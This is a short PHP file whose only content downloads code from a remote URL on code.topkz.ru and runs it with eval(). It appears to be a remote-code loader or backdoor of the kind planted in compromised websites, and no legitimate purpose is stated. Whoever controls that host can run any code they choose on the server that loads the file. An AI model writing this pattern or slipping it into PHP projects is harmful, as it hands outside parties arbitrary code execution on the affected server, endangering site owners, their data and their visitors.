<?php
$path = "https://code.topkz.ru/fgd/8/tdg3.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
